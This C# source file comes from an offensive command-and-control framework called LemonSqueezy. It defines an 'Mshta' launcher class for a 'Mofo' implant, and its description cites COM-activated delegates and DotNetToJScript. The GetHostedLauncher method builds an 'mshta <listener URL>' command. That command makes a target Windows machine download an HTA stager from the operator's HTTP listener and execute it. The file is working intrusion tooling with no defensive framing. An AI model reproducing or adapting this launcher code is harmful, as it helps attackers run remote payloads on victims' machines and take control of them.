﻿// Author: Ryan Cobb (@cobbr_io)
// Project: LemonSqueezy (https://github.com/cobbr/LemonSqueezy)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using LemonSqueezy.Models.Listeners;

namespace LemonSqueezy.Models.Launchers
{
    public class MshtaLauncher : ScriptletLauncher
    {
        public MshtaLauncher()
        {
            this.Name = "Mshta";
            this.Type = LauncherType.Mshta;
            this.Description = "Uses mshta.exe to launch a Mofo using a COM activated Delegate and ActiveXObjects (ala DotNetToJScript). Please note that DotNetToJScript-based launchers may not work on Windows 10 and Windows Server 2016.";
            this.ScriptType = ScriptletType.TaggedScript;
            this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
            this.CompressStager = false;
        }

        protected override string GetLauncher()
        {
            string launcher = "mshta" + " " + "file.hta";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                string launcher = "mshta" + " " + hostedLocation;
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }
    }
}
